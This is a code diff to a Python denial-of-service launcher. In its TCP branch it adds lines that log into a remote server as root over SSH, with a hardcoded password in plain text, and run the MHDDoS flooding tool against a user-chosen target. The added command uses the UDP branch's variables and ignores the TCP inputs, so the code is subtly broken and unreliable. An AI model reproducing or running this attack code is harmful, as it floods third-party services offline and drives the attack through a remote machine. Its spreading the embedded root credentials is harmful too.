@@ -86,3 +86,16 @@ if layer4input == "TCP":
     porttcp = input(f"port ══ ")
     threadstcp = input(f"threads ══ ")
     timetcp = input(f"time ══ ")
+
+    host2 = "ssh.surf"
+    username2 = "root"
+    password2 = "gaaBmc87Yw"
+    port2 = 8238
+    client = paramiko.client.SSHClient()
+    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+    client.connect(host2, port=port2, username=username2, password=password2)
+    _stdin, _stdout,_stderr = client.exec_command("cd root && cd MHDDoS && python3 start.py TCP " + ipudp + ":" + port1 + " 900 " + timeudp)
+    print(_stdout.read().decode())
+    time.sleep(5)
+    _stdin.close()
+    client.close()
